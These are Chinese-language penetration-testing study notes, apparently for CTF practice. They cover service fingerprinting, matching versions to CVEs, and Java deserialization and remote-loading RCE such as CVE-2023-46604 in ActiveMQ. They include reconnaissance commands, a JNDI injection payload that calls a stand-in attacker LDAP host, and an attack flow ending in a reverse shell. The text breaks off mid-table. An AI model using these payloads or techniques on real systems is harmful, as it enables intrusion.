
---

## 知识点 1：服务指纹识别（侦察阶段的核心思维）

### 识别信号
- 目录爆破全部返回 401/403，无法区分有效路径
- nmap 标出"奇怪/未知"服务，或把端口标成明显不符的服务名
- 看到一组成簇出现的端口

### 通用原理
**端口"打不开"≠ 没东西，而是"需要换思路"。** 401 = 需要认证，403 = 禁止访问。
盲目目录爆破在认证墙后毫无意义。正确动作是**识别服务身份**，而不是换字典/调线程。

### 通用打法
```bash
# 1. 看响应头，身份常常直接写在脸上
curl -i http://TARGET
#   关注：Server / X-Powered-By / WWW-Authenticate 的 realm / Set-Cookie 名 / 报错页特征

# 2. 自动指纹
whatweb http://TARGET
nmap -sV -sC -p PORT TARGET
nmap -sV -p PORT --script banner TARGET   # 拿到精确版本号

# 3. 带认证再爆破（确实需要时）
gobuster dir -u http://TARGET -w LIST -U user -P pass            # basic auth
gobuster dir -u http://TARGET -w LIST -b 401,403 --exclude-length N   # 排噪声
```

### 心法：指纹分层
一个 Web 服务往往是多层叠加，**漏洞几乎总在最里面的"应用层"**：

```
负载/代理层 (nginx, Apache, Cloudflare, HAProxy)
        ↓
容器/运行时层 (Jetty, Tomcat, Express, gunicorn)
        ↓
应用层 (ActiveMQ, Jenkins, GitLab, 自研应用)  ← 深挖这一层的版本
```

代理层和容器层的版本只用于**确认身份**；要找的是应用层组件的精确版本。

### 横向扩展：常见"端口组合即指纹"
| 端口组合 | 大概率是 |
|---|---|
| 1883 / 5672 / 61613-61616 | ActiveMQ（消息中间件）|
| 5672 + 15672 | RabbitMQ（15672 是管理界面）|
| 9092 | Kafka |
| 6379 | Redis |
| 27017 | MongoDB |
| 8161 | ActiveMQ 控制台 |
| 8080/8081 + 50000 | Jenkins |
| 8009 (AJP) | Tomcat（Ghostcat CVE-2020-1938）|
| 2375/2376 | Docker API |

---

## 知识点 2：从版本到 exploit（漏洞匹配方法论）

### 识别信号
拿到了某组件的精确版本号，需要判断能不能打。

### 通用原理（最重要的一条）
> **判断可打与否的标准 = 版本号是否落在某 CVE 的"受影响区间"，而不是某平台有没有现成脚本。**
> searchsploit / EDB 收录有限且更新慢，"EDB 没有"不代表"没洞"。

### 通用打法：四处都要查
```bash
searchsploit PRODUCT             # 1. 本地 EDB（方便但旧、按产品名而非版本号搜）
msfconsole -q -x "search PRODUCT" # 2. Metasploit（独立库，常有 EDB 没有的新洞）
# 3. GitHub 搜 "CVE-XXXX-XXXXX" 或 "PRODUCT version RCE"（最新 PoC 聚集地）
# 4. NVD / 厂商安全公告（确认受影响版本区间，不依赖任何现成脚本）
```

### 易错点
- searchsploit 按**产品名**或 **CVE** 命名，**不按精确版本号**。用 "5.15.15" 搜必然扑空，应搜 "activemq"。
- 搜到结果要逐条核对"受影响版本"，别看到名字像就用。例：`ActiveMQ < 5.14.0` 对 5.15.15 无效。

---

## 知识点 3：Java 反序列化 / 远程加载型 RCE（漏洞类别）

> 代表：CVE-2023-46604 (ActiveMQ OpenWire)。但这是一**类**漏洞，原理可迁移。

### 识别信号
- 目标是 Java 应用（Jetty/Tomcat/Spring 指纹）
- 接收序列化数据的端口（ActiveMQ OpenWire 61616、Java RMI、T3 等）
- CVE 描述里出现 deserialization / gadget / JNDI / ClassPathXmlApplicationContext / lookup

### 通用原理
不可信数据被反序列化时，攻击者可控制"实例化哪个类、传什么参数"。利用特定**gadget 类**把"实例化"变成"执行命令"。常见 gadget 模式：

1. **远程 XML 加载**（本例）：`ClassPathXmlApplicationContext(URL)` → 下载远程 Spring XML → XML 里 `ProcessBuilder` bean 执行命令。
2. **JNDI 注入**（Log4Shell 类）：`${jndi:ldap://attacker/x}` → 应用去 attacker 的 LDAP/RMI 拉取恶意类并加载执行。
3. **现成 gadget 链**（ysoserial）：CommonsCollections、Spring 等库里的链，直接生成可执行序列化字节。

### 通用打法（远程加载型的统一套路）
```
攻击者起一个服务托管 payload（HTTP 托管 XML / LDAP 服务返回恶意类）
        ↓
exploit 给目标发包，包里塞"去 attacker 的 URL 加载资源"
        ↓
目标主动回连 attacker 下载并执行 payload
        ↓
payload 触发反弹 shell
```

### 关键认知（最容易踩坑）
- **payload 文件放在你自己的服务器上**，URL 用 **LHOST（你的 IP）**，不是目标 IP。
- exploit 脚本只负责"让目标来下载"，**执行什么由你的 payload 决定**——脚本跑完≠拿到 shell。
- 验证靠看**你的 HTTP 服务器日志有没有目标的 GET 请求**，而不是看 exploit 输出。

### 横向扩展：同类 CVE / 技术
| 漏洞 | 载体 | gadget/手法 |
|---|---|---|
| CVE-2023-46604 | ActiveMQ OpenWire | ClassPathXmlApplicationContext + 远程 XML